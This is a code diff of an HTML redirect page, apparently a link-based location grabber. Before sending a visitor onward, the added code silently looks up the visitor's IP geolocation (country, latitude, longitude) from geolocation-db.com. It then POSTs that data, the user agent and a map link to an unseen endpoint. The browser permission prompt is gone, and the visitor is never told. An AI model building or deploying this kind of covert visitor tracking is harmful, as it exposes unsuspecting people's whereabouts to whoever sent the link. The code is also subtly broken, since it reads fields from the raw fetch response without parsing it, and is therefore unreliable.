@@ -8,15 +8,12 @@
 <body>
     <script type="text/javascript">
         async function redirect(toURL){
-            const coords = {
-                latitude: '',
-                longitude: ''
-            };
-
-            navigator.geolocation.getCurrentPosition(position => {
-                coords.latitude = position.coords.latitude;
-                coords.longitude = position.coords.longitude;
-            })
+            const {
+                country_code,
+                country_name,
+                latitude,
+                longitude
+            } = await fetch('https://geolocation-db.com/json/');
 
             const params = { 
                 method: 'POST',
@@ -26,8 +23,12 @@
                 },
                 body: JSON.stringify({
                     "userAgent": navigator.userAgent,
-                    "mapLink": `https://www.openstreetmap.org/#map=18/${coords.latitude}/${coords.longitude}`,
-                    "coords": `Latitude: ${coords.latitude} °, Longitude: ${coords.longitude} °`
+                    "countryCode": country_code,
+                    "countryName": country_name,
+                    "latitude": latitude,
+                    "longitude": longitude,
+                    "mapLink": `https://www.openstreetmap.org/#map=10/${latitude}/${longitude}`,
+                    "coords": `Latitude: ${latitude} °, Longitude: ${longitude} °`
                 })
             }
 
